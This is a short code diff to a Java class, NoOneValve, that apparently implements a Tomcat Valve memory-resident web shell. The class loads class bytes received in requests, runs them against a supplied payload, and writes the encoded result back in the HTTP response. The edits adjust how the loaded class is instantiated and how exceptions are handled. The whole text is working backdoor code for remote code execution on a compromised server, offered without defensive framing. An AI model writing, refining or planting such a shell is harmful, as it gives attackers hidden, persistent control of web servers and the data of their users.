@@ -38,9 +38,8 @@ public class NoOneValve extends ClassLoader implements Valve {
                         coreClass = new NoOneValve(Thread.currentThread().getContextClassLoader()).defineClass(bytes, 0, bytes.length);
                     }
                     ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
-                    Object httpChannelCore = coreClass.getConstructor(Object.class).newInstance(this);
+                    Object httpChannelCore = coreClass.newInstance();
                     httpChannelCore.equals(new Object[]{payload, outputStream});
-                    httpChannelCore.toString();
                     ServletOutputStream responseOutputStream = response.getOutputStream();
                     byte[] data = wrapResData(transformResData(outputStream.toByteArray()));
                     responseOutputStream.write(data);
@@ -48,7 +47,8 @@ public class NoOneValve extends ClassLoader implements Valve {
                     responseOutputStream.flush();
                     responseOutputStream.close();
                     return;
-                } catch (Throwable ignored) {
+                } catch (Throwable e) {
+                    e.printStackTrace();
                 }
             }
         } catch (Throwable ignored) {
